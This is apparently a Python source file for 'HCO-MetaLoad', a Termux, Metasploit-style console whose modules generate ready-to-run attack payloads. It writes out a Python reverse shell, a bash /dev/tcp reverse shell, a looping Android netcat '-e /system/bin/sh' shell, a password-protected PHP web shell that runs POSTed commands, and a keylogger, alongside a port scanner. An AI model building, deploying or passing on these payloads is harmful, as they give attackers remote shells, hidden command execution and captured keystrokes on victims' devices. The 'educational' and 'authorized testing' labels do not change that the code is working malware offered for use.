#!/usr/bin/env python3
"""
HCO-MetaLoad - Metasploit-like Framework (Termux Edition)

A Metasploit-style framework with payload creation capabilities.

Author: Azhar / Hackers Colony
License: For authorized testing only
"""

import os
import sys
import time
import platform
import socket
import threading
import json
import subprocess
import base64
from dataclasses import dataclass
from typing import Dict, List, Any

# ---------------------------
# Colors
# ---------------------------
GREEN = "\033[32m"
BLUE = "\033[34m"
RED = "\033[31m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
RESET = "\033[0m"

# ---------------------------
# Tool Lock & Subscription
# ---------------------------

def open_youtube_app():
    """Open YouTube app directly on Android"""
    try:
        result = subprocess.run([
            'am', 'start', 
            '-a', 'android.intent.action.VIEW',
            '-d', 'https://youtube.com/@hackers_colony_tech'
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        
        result = subprocess.run([
            'termux-open-url', 
            'https://youtube.com/@hackers_colony_tech'
        ], capture_output=True, text=True)
        
        return result.returncode == 0
        
    except Exception as e:
        print(f"{RED}Error opening YouTube app: {e}{RESET}")
        return False

def show_tool_lock():
    """Display tool lock message and countdown."""
    print(f"\n{RED}🔐 TOOL LOCK — IMPORTANT NOTICE 🔐{RESET}")
    print(f"{YELLOW}This tool is for EDUCATIONAL purposes only.{RESET}")
    print(f"{YELLOW}To continue, please subscribe to our channel.{RESET}")
    print(f"{CYAN}Channel: @hackers_colony_tech{RESET}")
    print(f"{CYAN}URL: https://youtube.com/@hackers_colony_tech{RESET}\n")
    
    print(f"{RED}Redirecting to YouTube app in...{RESET}")
    
    countdown_numbers = [9, 8, 7, 6, 5, 4, 3, 2, 1]
    countdown_str = ".".join(map(str, countdown_numbers))
    print(f"{MAGENTA}{countdown_str}{RESET}")
    
    for number in countdown_numbers:
        print(f"{RED}{number}{RESET}", end=".", flush=True)
        time.sleep(0.5)
    
    print(f"\n\n{GREEN}Opening YouTube app...{RESET}")
    time.sleep(2)
    
    if open_youtube_app():
        print(f"{GREEN}✓ YouTube app opened successfully!{RESET}")
        print(f"{YELLOW}Please subscribe to our channel and return to Termux.{RESET}")
    else:
        print(f"{RED}✗ Could not open YouTube app automatically.{RESET}")
        print(f"{YELLOW}Please manually open YouTube and visit:{RESET}")
        print(f"{CYAN}https://youtube.com/@hackers_colony_tech{RESET}")
    
    print(f"\n{YELLOW}" + "="*50 + RESET)
    try:
        input(f"\n{YELLOW}After subscribing, press Enter to continue...{RESET}")
    except KeyboardInterrupt:
        print(f"\n{RED}Operation cancelled.{RESET}")
        sys.exit(1)

def show_welcome_banner():
    """Display HCO MetaLoad by Azhar in green inside red box."""
    os.system("clear" if os.name != "nt" else "cls")
    
    print(f"{RED}╔════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}║                                                    ║{RESET}")
    print(f"{RED}║              {GREEN}HCO MetaLoad by Azhar{RED}               ║{RESET}")
    print(f"{RED}║                                                    ║{RESET}")
    print(f"{RED}╚════════════════════════════════════════════════════╝{RESET}")
    print(f"{CYAN}         Metasploit-like Framework v2.0{RESET}")
    print(f"{YELLOW}           Termux Edition - Educational Use{RESET}\n")

# ---------------------------
# Module Base Classes
# ---------------------------

@dataclass
class Module:
    name: str
    description: str
    author: str
    type: str
    references: List[str]
    options: Dict[str, Any]

class ExploitModule(Module):
    def __init__(self, **kwargs):
        kwargs['type'] = 'exploit'
        super().__init__(**kwargs)
    
    def run(self, **kwargs):
        raise NotImplementedError

class AuxiliaryModule(Module):
    def __init__(self, **kwargs):
        kwargs['type'] = 'auxiliary'
        super().__init__(**kwargs)
    
    def run(self, **kwargs):
        raise NotImplementedError

class PayloadModule(Module):
    def __init__(self, **kwargs):
        kwargs['type'] = 'payload'
        super().__init__(**kwargs)
    
    def generate(self, **kwargs):
        raise NotImplementedError

# ---------------------------
# Payload Modules
# ---------------------------

class PythonReverseShell(PayloadModule):
    def __init__(self):
        super().__init__(
            name="python_reverse_shell",
            description="Python reverse shell payload",
            author="HCO Team",
            references=[],
            options={
                "LHOST": {"required": True, "description": "Listener IP address"},
                "LPORT": {"required": True, "description": "Listener port"},
                "OUTPUT": {"required": False, "description": "Output file (default: payload.py)"}
            }
        )
    
    def generate(self, **kwargs):
        lhost = kwargs.get("LHOST", "127.0.0.1")
        lport = kwargs.get("LPORT", "4444")
        output_file = kwargs.get("OUTPUT", "payload.py")
        
        payload_code = f'''#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{lhost}", {lport}))
        
        # Redirect stdin, stdout, stderr to socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Start shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        pass

if __name__ == "__main__":
    reverse_shell()
'''
        
        try:
            with open(output_file, "w") as f:
                f.write(payload_code)
            os.chmod(output_file, 0o755)
            
            print(f"{GREEN}[+] Python reverse shell payload generated!{RESET}")
            print(f"{CYAN}[*] File: {output_file}{RESET}")
            print(f"{CYAN}[*] Listener: nc -lvnp {lport}{RESET}")
            print(f"{YELLOW}[!] Usage: python3 {output_file}{RESET}")
            
            return {
                "payload_type": "python_reverse_shell",
                "lhost": lhost,
                "lport": lport,
                "output_file": output_file,
                "status": "generated"
            }
        except Exception as e:
            print(f"{RED}[-] Error generating payload: {e}{RESET}")
            return {"status": "error", "error": str(e)}

class BashReverseShell(PayloadModule):
    def __init__(self):
        super().__init__(
            name="bash_reverse_shell",
            description="Bash reverse shell payload",
            author="HCO Team",
            references=[],
            options={
                "LHOST": {"required": True, "description": "Listener IP address"},
                "LPORT": {"required": True, "description": "Listener port"},
                "OUTPUT": {"required": False, "description": "Output file (default: payload.sh)"}
            }
        )
    
    def generate(self, **kwargs):
        lhost = kwargs.get("LHOST", "127.0.0.1")
        lport = kwargs.get("LPORT", "4444")
        output_file = kwargs.get("OUTPUT", "payload.sh")
        
        payload_code = f'''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
        
        try:
            with open(output_file, "w") as f:
                f.write(payload_code)
            os.chmod(output_file, 0o755)
            
            print(f"{GREEN}[+] Bash reverse shell payload generated!{RESET}")
            print(f"{CYAN}[*] File: {output_file}{RESET}")
            print(f"{CYAN}[*] Listener: nc -lvnp {lport}{RESET}")
            print(f"{YELLOW}[!] Usage: bash {output_file}{RESET}")
            
            return {
                "payload_type": "bash_reverse_shell",
                "lhost": lhost,
                "lport": lport,
                "output_file": output_file,
                "status": "generated"
            }
        except Exception as e:
            print(f"{RED}[-] Error generating payload: {e}{RESET}")
            return {"status": "error", "error": str(e)}

class PHPWebShell(PayloadModule):
    def __init__(self):
        super().__init__(
            name="php_web_shell",
            description="PHP web shell payload",
            author="HCO Team",
            references=[],
            options={
                "PASSWORD": {"required": False, "description": "Access password (default: hco)"},
                "OUTPUT": {"required": False, "description": "Output file (default: shell.php)"}
            }
        )
    
    def generate(self, **kwargs):
        password = kwargs.get("PASSWORD", "hco")
        output_file = kwargs.get("OUTPUT", "shell.php")
        
        payload_code = f'''<?php
if(isset($_POST['pass']) && $_POST['pass'] == "{password}") {{
    if(isset($_POST['cmd'])) {{
        system($_POST['cmd']);
    }}
}}
?>
<html>
<body>
<form method="post">
Password: <input type="password" name="pass">
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
</body>
</html>
'''
        
        try:
            with open(output_file, "w") as f:
                f.write(payload_code)
            
            print(f"{GREEN}[+] PHP web shell payload generated!{RESET}")
            print(f"{CYAN}[*] File: {output_file}{RESET}")
            print(f"{CYAN}[*] Password: {password}{RESET}")
            print(f"{YELLOW}[!] Upload to web server and access via browser{RESET}")
            
            return {
                "payload_type": "php_web_shell",
                "password": password,
                "output_file": output_file,
                "status": "generated"
            }
        except Exception as e:
            print(f"{RED}[-] Error generating payload: {e}{RESET}")
            return {"status": "error", "error": str(e)}

class PythonKeylogger(PayloadModule):
    def __init__(self):
        super().__init__(
            name="python_keylogger",
            description="Python keylogger payload",
            author="HCO Team",
            references=[],
            options={
                "OUTPUT": {"required": False, "description": "Output file (default: keylogger.py)"},
                "LOG_FILE": {"required": False, "description": "Log file (default: keys.log)"}
            }
        )
    
    def generate(self, **kwargs):
        output_file = kwargs.get("OUTPUT", "keylogger.py")
        log_file = kwargs.get("LOG_FILE", "keys.log")
        
        payload_code = f'''#!/usr/bin/env python3
import keyboard
import time
from datetime import datetime

def keylogger():
    log_file = "{log_file}"
    
    def on_key(event):
        with open(log_file, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{{timestamp}}] {{event.name}}\\n")
    
    keyboard.on_press(on_key)
    
    print("Keylogger started... Press ESC to stop")
    keyboard.wait('esc')

if __name__ == "__main__":
    keylogger()
'''
        
        try:
            with open(output_file, "w") as f:
                f.write(payload_code)
            os.chmod(output_file, 0o755)
            
            print(f"{GREEN}[+] Python keylogger payload generated!{RESET}")
            print(f"{CYAN}[*] File: {output_file}{RESET}")
            print(f"{CYAN}[*] Log file: {log_file}{RESET}")
            print(f"{YELLOW}[!] Requires: pip install keyboard{RESET}")
            
            return {
                "payload_type": "python_keylogger",
                "output_file": output_file,
                "log_file": log_file,
                "status": "generated"
            }
        except Exception as e:
            print(f"{RED}[-] Error generating payload: {e}{RESET}")
            return {"status": "error", "error": str(e)}

class AndroidPayload(PayloadModule):
    def __init__(self):
        super().__init__(
            name="android_payload",
            description="Android reverse shell payload",
            author="HCO Team",
            references=[],
            options={
                "LHOST": {"required": True, "description": "Listener IP address"},
                "LPORT": {"required": True, "description": "Listener port"},
                "OUTPUT": {"required": False, "description": "Output file (default: android_payload.sh)"}
            }
        )
    
    def generate(self, **kwargs):
        lhost = kwargs.get("LHOST", "127.0.0.1")
        lport = kwargs.get("LPORT", "4444")
        output_file = kwargs.get("OUTPUT", "android_payload.sh")
        
        payload_code = f'''#!/system/bin/sh
# Android Reverse Shell
while true; do
    nc {lhost} {lport} -e /system/bin/sh
    sleep 10
done
'''
        
        try:
            with open(output_file, "w") as f:
                f.write(payload_code)
            os.chmod(output_file, 0o755)
            
            print(f"{GREEN}[+] Android payload generated!{RESET}")
            print(f"{CYAN}[*] File: {output_file}{RESET}")
            print(f"{CYAN}[*] Listener: nc -lvnp {lport}{RESET}")
            print(f"{YELLOW}[!] Requires root access on Android{RESET}")
            
            return {
                "payload_type": "android_reverse_shell",
                "lhost": lhost,
                "lport": lport,
                "output_file": output_file,
                "status": "generated"
            }
        except Exception as e:
            print(f"{RED}[-] Error generating payload: {e}{RESET}")
            return {"status": "error", "error": str(e)}

# ---------------------------
# Existing Modules (from previous code)
# ---------------------------

class PortScanner(AuxiliaryModule):
    def __init__(self):
        super().__init__(
            name="port_scanner",
            description="TCP port scanner",
            author="HCO Team",
            references=[],
            options={
                "RHOSTS": {"required": True, "description": "Target address"},
                "PORTS": {"required": False, "description": "Ports to scan (default: 1-100)"}
            }
        )
    
    def run(self, **kwargs):
        target = kwargs.get("RHOSTS", "127.0.0.1")
        ports_range = kwargs.get("PORTS", "1-100")
        
        print(f"{CYAN}[*] Scanning {target} ports {ports_range}{RESET}")
        
        if "-" in ports_range:
            start, end = map(int, ports_range.split("-"))
            ports = list(range(start, end + 1))
        else:
            ports = [int(p.strip()) for p in ports_range.split(",")]
        
        open_ports = []
        
        for port in ports[:50]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    service_name = self.get_service_name(port)
                    print(f"{GREEN}[+] {target}:{port} - {service_name} - OPEN{RESET}")
            except:
                pass
        
        return {
            "target": target,
            "open_ports": sorted(open_ports),
            "total_scanned": len(ports[:50])
        }
    
    def get_service_name(self, port):
        services = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS", 3389: "RDP"}
        return services.get(port, "Unknown")

class SystemInfoGatherer(AuxiliaryModule):
    def __init__(self):
        super().__init__(
            name="system_info",
            description="Gather system information",
            author="HCO Team",
            references=[],
            options={}
        )
    
    def run(self, **kwargs):
        info = {
            "Platform": platform.platform(),
            "Hostname": socket.gethostname(),
            "Python Version": platform.python_version(),
            "Timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        print(f"{CYAN}[*] Gathering system information...{RESET}")
        for key, value in info.items():
            print(f"{GREEN}[+] {key}: {value}{RESET}")
        
        return info

# ---------------------------
# Framework Core with Payload Support
# ---------------------------

class HCOMetaLoadFramework:
    def __init__(self):
        self.modules = {}
        self.current_module = None
        self.module_options = {}
        self.load_modules()
    
    def load_modules(self):
        """Load all available modules including payloads"""
        # Payload modules
        self.modules.update({
            "payload/python_reverse": PythonReverseShell(),
            "payload/bash_reverse": BashReverseShell(),
            "payload/php_webshell": PHPWebShell(),
            "payload/python_keylogger": PythonKeylogger(),
            "payload/android": AndroidPayload(),
        })
        
        # Auxiliary modules
        self.modules.update({
            "auxiliary/port_scanner": PortScanner(),
            "auxiliary/system_info": SystemInfoGatherer(),
        })
    
    def show_banner(self):
        """Show main framework banner"""
        show_welcome_banner()
        print(f"{GREEN}[+] {len(self.modules)} modules loaded ({sum(1 for m in self.modules.values() if m.type == 'payload')} payloads){RESET}")
        print(f"{YELLOW}[*] Type 'help' for available commands{RESET}\n")
    
    def show_modules(self, module_type=None):
        """List available modules"""
        print(f"\n{CYAN}Available Modules{RESET}")
        print("=" * 60)
        
        for module_path, module in self.modules.items():
            if module_type and not module_path.startswith(module_type):
                continue
            
            if module.type == "exploit":
                color = RED
            elif module.type == "payload":
                color = MAGENTA
            else:  # auxiliary
                color = BLUE
                
            print(f"  {color}{module_path:<30}{RESET}  {module.description}")
        
        print(f"\n{YELLOW}Use: use <module_path>{RESET}")
    
    def use_module(self, module_path):
        """Select a module to use"""
        if module_path not in self.modules:
            print(f"{RED}[!] Module not found: {module_path}{RESET}")
            return False
        
        self.current_module = self.modules[module_path]
        self.module_options = self.current_module.options.copy()
        
        print(f"{GREEN}[+] Using module: {module_path}{RESET}")
        print(f"{CYAN}[*] Type: {self.current_module.type}{RESET}")
        print(f"{CYAN}[*] Description: {self.current_module.description}{RESET}")
        
        self.show_options()
        return True
    
    def show_options(self):
        """Show module options"""
        if not self.current_module:
            print(f"{RED}[!] No module selected{RESET}")
            return
        
        print(f"\n{CYAN}Module options ({self.current_module.name}):{RESET}")
        print("-" * 50)
        
        for opt_name, opt_info in self.module_options.items():
            required = "yes" if opt_info.get("required", False) else "no"
            current_value = opt_info.get("value", "")
            print(f"   {GREEN}{opt_name:<15}{RESET} {current_value:<15} {opt_info.get('description', '')} (required: {required})")
    
    def set_option(self, option_name, value):
        """Set module option"""
        if not self.current_module:
            print(f"{RED}[!] No module selected{RESET}")
            return False
        
        if option_name not in self.module_options:
            print(f"{RED}[!] Invalid option: {option_name}{RESET}")
            return False
        
        self.module_options[option_name]["value"] = value
        print(f"{GREEN}[+] {option_name} => {value}{RESET}")
        return True
    
    def run_module(self):
        """Execute the current module"""
        if not self.current_module:
            print(f"{RED}[!] No module selected{RESET}")
            return
        
        # Check required options
        for opt_name, opt_info in self.module_options.items():
            if opt_info.get("required", False) and not opt_info.get("value"):
                print(f"{RED}[!] Required option not set: {opt_name}{RESET}")
                return
        
        # Prepare parameters
        params = {}
        for opt_name, opt_info in self.module_options.items():
            if opt_info.get("value"):
                params[opt_name] = opt_info["value"]
        
        print(f"{CYAN}[*] Running module...{RESET}")
        try:
            if hasattr(self.current_module, 'generate') and self.current_module.type == 'payload':
                result = self.current_module.generate(**params)
            else:
                result = self.current_module.run(**params)
            print(f"{GREEN}[+] Module completed{RESET}")
        except Exception as e:
            print(f"{RED}[-] Module execution failed: {e}{RESET}")
    
    def show_help(self):
        """Show help menu"""
        help_text = f"""
{CYAN}HCO-MetaLoad Commands{RESET}
{WHITE}====================={RESET}

{GREEN}Core Commands{RESET}
    {YELLOW}help{RESET}        - Show this help
    {YELLOW}exit{RESET}        - Exit framework
    {YELLOW}clear{RESET}       - Clear screen

{GREEN}Module Commands{RESET}
    {YELLOW}show modules{RESET}       - List all modules
    {YELLOW}show payloads{RESET}      - List payload modules
    {YELLOW}show auxiliary{RESET}     - List auxiliary modules
    {YELLOW}use <module>{RESET}       - Select module
    {YELLOW}back{RESET}               - Deselect module
    {YELLOW}show options{RESET}       - Show options
    {YELLOW}set <opt> <val>{RESET}    - Set option
    {YELLOW}run{RESET}                - Execute/generate module

{GREEN}Payload Examples{RESET}
    {CYAN}use payload/python_reverse{RESET}
    {CYAN}set LHOST 192.168.1.100{RESET}
    {CYAN}set LPORT 4444{RESET}
    {CYAN}run{RESET}

    {CYAN}use payload/php_webshell{RESET}
    {CYAN}set PASSWORD mypass123{RESET}
    {CYAN}run{RESET}

"""
        print(help_text)

# ---------------------------
# Main Console Interface
# ---------------------------

def main():
    # Show tool lock and subscription message first
    show_tool_lock()
    
    # Show welcome banner after subscription
    framework = HCOMetaLoadFramework()
    framework.show_banner()
    
    while True:
        try:
            if framework.current_module:
                prompt = f"{RED}hco{RESET} {YELLOW}({framework.current_module.name}){RESET} > "
            else:
                prompt = f"{RED}hco{RESET} > "
            
            command = input(prompt).strip()
            
            if not command:
                continue
            
            elif command == "exit" or command == "quit":
                print(f"{GREEN}[+] Thank you for using HCO-MetaLoad!{RESET}")
                break
            
            elif command == "help":
                framework.show_help()
            
            elif command == "clear":
                framework.show_banner()
            
            elif command == "show modules":
                framework.show_modules()
            
            elif command == "show payloads":
                framework.show_modules("payload")
            
            elif command == "show auxiliary":
                framework.show_modules("auxiliary")
            
            elif command.startswith("use "):
                module_path = command[4:].strip()
                framework.use_module(module_path)
            
            elif command == "back":
                framework.current_module = None
                print(f"{GREEN}[+] Module deselected{RESET}")
            
            elif command == "show options":
                framework.show_options()
            
            elif command.startswith("set "):
                parts = command[4:].strip().split(" ", 1)
                if len(parts) == 2:
                    framework.set_option(parts[0], parts[1])
                else:
                    print(f"{RED}[!] Usage: set <option> <value>{RESET}")
            
            elif command == "run":
                framework.run_module()
            
            else:
                print(f"{RED}[!] Unknown command: {command}{RESET}")
                print(f"{YELLOW}[*] Type 'help' for commands{RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[*] Use 'exit' to quit{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")

if __name__ == "__main__":
    main()
